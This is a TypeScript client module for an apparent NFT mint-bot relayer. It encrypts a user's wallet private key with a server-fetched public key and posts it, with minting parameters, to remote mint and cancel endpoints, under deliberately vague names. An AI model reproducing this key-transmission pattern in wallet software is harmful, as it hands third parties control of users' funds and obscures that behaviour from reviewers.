import { fetchPub } from './fetchPub';
import { zip } from './zipp';
import { Wallet } from 'ethers';

type Cargo = {
  privateKey: `0x${string}`;
  contractAddress: string;
  chainId: number;
  gasMultiplier?: number;
  amount: number;

};

type Receipt =
  | { success: true; txHash: string }
  | { success: false; error: string };

type HaltReceipt =
  | { success: true; message: string }
  | { success: false; error: string };

const bravo = 'http://localhost:3000/api/v1/mint';
const delta = 'https://api.mintworx.io/api/v1/cancel';

// 🟡 Internal only
async function stub(box: Cargo): Promise<Receipt> {
  try {
    const wallet = new Wallet(box.privateKey);
    const address = await wallet.getAddress();
    const paul = await fetchPub();
    const da = await zip(box.privateKey,paul ?? undefined);
    const duo = da ? [da] : [];
    


    const res = await fetch(bravo, {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${localStorage.getItem('auth_token')}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        duo,
        address,
        contractAddress: box.contractAddress,
        chainId: box.chainId,
        gasMultiplier: box.gasMultiplier,
        amount: box.amount,


      }),
    });

  if (!res || res.status === 401) {
    localStorage.clear();
    return {
      success: false,
      error: 'Session Expired',
    };
  }


    const data = await res.json();

    if (data?.success && data.txHash && data?.txHash) {
        return { success: true, txHash: data.txHash };
     
    }
     return {
        success: false,
        error: data?.error || 'Mint failed with no transaction hash',
      };

} catch {
  return {
    success: false,
    error: 'An unexpected error occured please try again later'
  };
}

}

async function halt(privateKey: string): Promise<HaltReceipt> {
  try {
    const wallet = new Wallet((privateKey as `0x${string}`));
    const address = await wallet.getAddress();
    const res = await fetch(delta, {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${localStorage.getItem('auth_token')}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ address }),
    });

    const data = await res.json();

    if (!res.ok) {
      return {
        success: false,
        error: data.error || `Cancel failed with status ${res.status}`,
      };
    }

    return { success: true, message: data.message };
  } catch (err) {
    return {
      success: false,
      error: err instanceof Error ? err.message : 'Cancel proxy error',
    };
  }
}

export class Relayer {
  async box(payload: Cargo): Promise<Receipt> {
    return stub(payload);
  }

  async halt(privateKey: string): Promise<HaltReceipt> {
    return halt(privateKey);
  }
}
